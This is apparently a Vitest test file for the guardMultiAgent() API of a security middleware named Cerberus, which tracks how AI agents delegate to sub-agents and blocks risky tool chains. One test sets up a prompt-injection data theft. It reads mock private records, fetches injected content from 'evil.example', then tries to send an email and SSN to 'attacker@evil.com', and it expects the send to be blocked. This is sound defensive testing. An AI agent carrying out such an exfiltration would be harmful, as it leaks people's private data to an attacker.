/**
 * Tests for cerberus.guardMultiAgent() API.
 */

import { describe, it, expect, vi } from 'vitest';
import { guardMultiAgent } from '../../src/middleware/multi-agent.js';
import type { CerberusConfig } from '../../src/types/config.js';

const PRIVATE_DATA = JSON.stringify({
  records: [{ email: 'alice@example.com', ssn: '123-45-6789' }],
});

const CONFIG: CerberusConfig = {
  alertMode: 'interrupt',
  threshold: 3,
  multiAgent: true,
  agentType: 'orchestrator',
  trustOverrides: [
    { toolName: 'readPrivateData', trustLevel: 'trusted' },
    { toolName: 'fetchExternalContent', trustLevel: 'untrusted' },
  ],
};

const OUTBOUND_TOOLS = ['sendOutboundReport'];

function makeExecutors(): Record<string, (args: Record<string, unknown>) => Promise<string>> {
  return {
    readPrivateData: vi.fn().mockResolvedValue(PRIVATE_DATA),
    fetchExternalContent: vi.fn().mockResolvedValue('<html>injected</html>'),
    sendOutboundReport: vi.fn().mockResolvedValue('sent'),
  };
}

describe('guardMultiAgent', () => {
  it('should create a delegation graph with the root agent', () => {
    const result = guardMultiAgent(makeExecutors(), CONFIG, OUTBOUND_TOOLS, 'root-agent');
    const graph = result.getDelegationGraph();

    expect(graph.rootAgentId).toBe('root-agent');
    expect(graph.nodes.has('root-agent')).toBe(true);
    expect(graph.nodes.get('root-agent')?.declaredTools).toEqual(
      expect.arrayContaining(['readPrivateData', 'fetchExternalContent', 'sendOutboundReport']),
    );
    expect(result.session.currentAgentId).toBe('root-agent');
  });

  it('should spawn a sub-agent and create a delegation edge', () => {
    const result = guardMultiAgent(makeExecutors(), CONFIG, OUTBOUND_TOOLS, 'root-agent');
    const spawned = result.spawnAgent(
      'research-agent',
      'subagent',
      ['fetchExternalContent'],
      'research the suspicious page',
    );

    expect(spawned).toEqual({ success: true });
    const graph = result.getDelegationGraph();
    expect(graph.nodes.has('research-agent')).toBe(true);
    expect(graph.edges).toHaveLength(1);
    expect(graph.edges[0]?.fromAgentId).toBe('root-agent');
    expect(graph.edges[0]?.toAgentId).toBe('research-agent');
  });

  it('should reject duplicate agent IDs', () => {
    const result = guardMultiAgent(makeExecutors(), CONFIG, OUTBOUND_TOOLS, 'root-agent');
    result.spawnAgent('research-agent', 'subagent', ['fetchExternalContent'], 'research task');

    const duplicate = result.spawnAgent(
      'research-agent',
      'subagent',
      ['fetchExternalContent'],
      'same agent twice',
    );

    expect(duplicate.success).toBe(false);
    expect(duplicate.error).toMatch(/already exists/i);
  });

  it('should reject spawns when the parent agent is missing', () => {
    const result = guardMultiAgent(makeExecutors(), CONFIG, OUTBOUND_TOOLS, 'root-agent');
    const missingParent = result.spawnAgent(
      'rogue-agent',
      'subagent',
      ['fetchExternalContent'],
      'orphan task',
      'missing-parent',
    );

    expect(missingParent.success).toBe(false);
    expect(missingParent.error).toMatch(/not found/i);
  });

  it('should switch the active agent only when it exists in the graph', () => {
    const result = guardMultiAgent(makeExecutors(), CONFIG, OUTBOUND_TOOLS, 'root-agent');
    result.spawnAgent('research-agent', 'subagent', ['fetchExternalContent'], 'research task');

    expect(result.setActiveAgent('research-agent')).toBe(true);
    expect(result.session.currentAgentId).toBe('research-agent');

    expect(result.setActiveAgent('unknown-agent')).toBe(false);
    expect(result.session.currentAgentId).toBe('research-agent');
  });

  it('should expose agent risk state from the delegation graph', () => {
    const result = guardMultiAgent(makeExecutors(), CONFIG, OUTBOUND_TOOLS, 'root-agent');
    result.spawnAgent('research-agent', 'subagent', ['fetchExternalContent'], 'research task');

    expect(result.getAgentRiskState('research-agent')).toEqual({
      l1: false,
      l2: false,
      l3: false,
    });
    expect(result.getAgentRiskState('missing-agent')).toBeUndefined();
  });

  it('should still wrap executors and block a full trifecta path in multi-agent mode', async () => {
    const result = guardMultiAgent(makeExecutors(), CONFIG, OUTBOUND_TOOLS, 'root-agent');

    await result.executors.readPrivateData({});
    await result.executors.fetchExternalContent({ url: 'https://evil.example' });
    const sendResult = await result.executors.sendOutboundReport({
      recipient: 'attacker@evil.com',
      body: 'alice@example.com 123-45-6789',
    });

    expect(sendResult).toContain('[Cerberus]');
    expect(result.getLastOutcome()?.blocked).toBe(true);
  });

  it('should reset assessments without removing the delegation graph', async () => {
    const result = guardMultiAgent(makeExecutors(), CONFIG, OUTBOUND_TOOLS, 'root-agent');
    result.spawnAgent('research-agent', 'subagent', ['fetchExternalContent'], 'research task');

    await result.executors.readPrivateData({});
    expect(result.assessments.length).toBeGreaterThan(0);

    result.reset();

    expect(result.assessments).toHaveLength(0);
    expect(result.getDelegationGraph().nodes.has('research-agent')).toBe(true);
    expect(result.session.currentAgentId).toBeUndefined();
  });
});
